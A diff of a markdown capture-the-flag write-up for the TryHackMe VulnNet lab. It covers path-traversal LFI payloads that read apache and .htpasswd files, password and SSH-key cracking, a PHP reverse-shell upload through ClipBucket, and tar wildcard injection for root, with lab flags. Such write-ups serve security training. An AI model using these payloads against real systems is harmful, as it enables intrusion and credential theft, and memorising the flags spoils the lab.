@@ -1,19 +1,17 @@
 ---
 sticker: emoji//1f978
 ---
+# ENUMERATION
+---
 
-# VULNNET
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 80   | HTTP    |
 
@@ -36,9 +34,8 @@ PORT   STATE SERVICE REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-## RECONNAISSANCE
-
-***
+# RECONNAISSANCE
+---
 
 We need to add `vulnet.thm` to `/etc/hosts`:
 
@@ -46,7 +43,9 @@ We need to add `vulnet.thm` to `/etc/hosts`:
 echo 'IP vulnnet.thm' | sudo tee -a /etc/hosts
 ```
 
+
 We can begin by fuzzing to check any hidden directories
+
 
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://vulnnet.thm/FUZZ" -ic -c -t 200
@@ -77,17 +76,18 @@ js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration:
 fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 162ms]
 ```
 
+
 If we go inside the `js` directory, we can find this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250401144159.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250401144159.png)
 
 If we check the first one, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250401144226.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250401144226.png)
 
 The code is pretty messy, let's use a beautifier to look at it better:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250401144258.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250401144258.png)
 
 If we check at the code, we can find a hidden subdomain:
 
@@ -95,27 +95,30 @@ If we check at the code, we can find a hidden subdomain:
 broadcast.vulnnet.thm
 ```
 
+
 Let's check it out:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250401144421.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250401144421.png)
 
 We got a login prompt, since we don't have credentials, we need to leave it like that for now, if we remember correctly, we got another `js` file, let's read it too:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250401145736.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250401145736.png)
 
 If we check this, we got a hidden parameter at `index.php`, it is `referer=`, we can test this parameter to check its behavior, for example, if this is not correctly configured, we could exploit this to achieve `LFI` in order to read configuration files, let's submit the request to our proxy:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250401145938.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250401145938.png)
 
 There we go, we can read files, Let's begin exploitation.
 
-## EXPLOITATION
 
-***
+
+
+# EXPLOITATION
+---
 
 Since we got LFI, we can try reading some standard files like `/var/www/html/config.php`, if we do this, we get the following:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250401160803.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250401160803.png)
 
 Even while trying a php filter, output does not appear, which means this file may not exist or may not be readable, let's try some other stuff, for example, since we are dealing with apache2, we can try reading the configuration file for it:
 
@@ -123,7 +126,7 @@ Even while trying a php filter, output does not appear, which means this file ma
 ../../../../../../etc/apache2/apache2.conf
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250401161052.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250401161052.png)
 
 Output does not appear, maybe we need to apply some other technique, what about double slashes: `//`:
 
@@ -131,7 +134,8 @@ Output does not appear, maybe we need to apply some other technique, what about 
 ..//..//..//..//..//..//etc/apache2/apache2.conf
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250401161201.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250401161201.png)
 
 There we go, with this we now that we are able to read configuration files from apache2, now, let's go back to our context, for example, we are dealing with another subdomain called `broadcast.vulnnet.thm`, we are able to read web configurations in the `/etc/apache2/sites-enabled/000-default.conf` file, let's check it out:
 
@@ -139,15 +143,18 @@ There we go, with this we now that we are able to read configuration files from 
 ..//..//..//..//..//..///etc/apache2/sites-enabled/000-default.conf
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250401161443.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250401161443.png)
+
 
 We can see that we are able to read the `.htpasswd` file, The `.htpasswd` file is commonly used in web servers to store usernames and password pairs for basic authentication. It is typically used in conjunction with the Apache HTTP Server, but can be used with other web servers as well. The file contains encrypted passwords, which are used to verify the identity of users attempting to access restricted areas of a website, knowing this, we now that reading this file can get us access to the other subdomain:
+
 
 ```
 ..//..//..//..//..//..///etc/apache2/.htpasswd
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250401161643.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250401161643.png)
+
 
 We get the following credentials:
 
@@ -161,7 +168,9 @@ Since this is in a hashed format, we need to crack it, for this, we can use john
 echo 'developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0' > hash.txt
 ```
 
+
 We can then proceed to crack it:
+
 
 ```
 john --format=md5crypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
@@ -184,23 +193,30 @@ developers:9972761drmfsls
 
 With the credentials, we are now able to log into the `broadcast.vulnnet.thm` subdomain:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250401162216.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250401162216.png)
+
 
 We are inside something called `ClipBucket`, let's search the version in the source code:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250401162351.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250401162351.png)
 
 So, `ClipBucket 4.0`, let's search for an exploit:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250401162441.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250401162441.png)
+
 
 There we go, we can upload files, if we check `exploit-db`, we can check the following PoC:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250401162859.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250401162859.png)
+
+
 
 Since we can upload files, let's upload a reverse shell, we can use the one at `PentestMonkey` github
 
 Link: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
 
 Save the file and do the following:
 
@@ -214,7 +230,8 @@ We get this response:
 {"success":"yes","file_name":"17436166695449b9","extension":"php","file_directory":"2025\/04\/02"}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250402125929.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250402125929.png)
 
 We can now visit the following URL:
 
@@ -224,21 +241,23 @@ http://broadcast.vulnnet.thm/files/photos/
 
 We notice this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250402130005.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250402130005.png)
 
 There's a directory, if we follow it, we get to this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250402130032.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250402130032.png)
+
 
 This is our reverse shell, let's set up our listener and get the connection:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250402130104.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250402130104.png)
 
 Let's proceed to privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+# PRIVILEGE ESCALATION
+---
+
 
 Since we got our shell, let's stabilize it:
 
@@ -252,15 +271,15 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250402130331.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250402130331.png)
 
 If we look around, we can find this inside of `/var/backups`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250402132010.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250402132010.png)
 
 We got a `ssh-backup.tar.gz`, if we look at the `home` directory, we find there's an user called `server-managment`, if we are able to unzip this file, we may be able to get either the credentials or the `id_rsa` of this user, let's get it in our local machine:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250402132117.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250402132117.png)
 
 There we go, we got the `id_rsa`:
 
@@ -309,7 +328,7 @@ oneTWO3gOyac     (id_rsa)
 
 There we go, we got our passphrase, let's go into ssh now:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250402132444.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250402132444.png)
 
 We are now able to read `user.txt`:
 
@@ -320,7 +339,7 @@ THM{907e420d979d8e2992f3d7e16bee1e8b}
 
 We can use `linpeas` to check for a way to get into root:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250402132806.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250402132806.png)
 
 ```
 server-management@vulnnet:~$ cat /var/opt/backupsrv.sh
@@ -355,7 +374,7 @@ date
 ls -lh $dest
 ```
 
-This command backs up **all files** in the directory. Since we control files in `/home/server-management/Documents`, we can inject malicious filenames that `tar` interprets as command-line arguments (e.g., `--checkpoint-action` to execute arbitrary code). Let's reproduce the following in order to get a root shell:
+This command backs up **all files** in the directory. Since we control files in `/home/server-management/Documents`, we can inject malicious filenames that `tar` interprets as command-line arguments (e.g., `--checkpoint-action` to execute arbitrary code). Let's reproduce the following in order to get a root shell:
 
 ```
 # Let's begin by generating a netcat reverse shell using msfvenom
@@ -370,7 +389,7 @@ nc -lvnp PORT
 
 Now, if we wait up 2 minutes and check our listener, this happens:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250402134609.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250402134609.png)
 
 There we go, we got root and can finally read `root.txt`:
 
@@ -379,4 +398,6 @@ root@vulnnet:/home/server-management/Documents# cat /root/root.txt
 THM{220b671dd8adc301b34c2738ee8295ba}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250402134654.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250402134654.png)
+
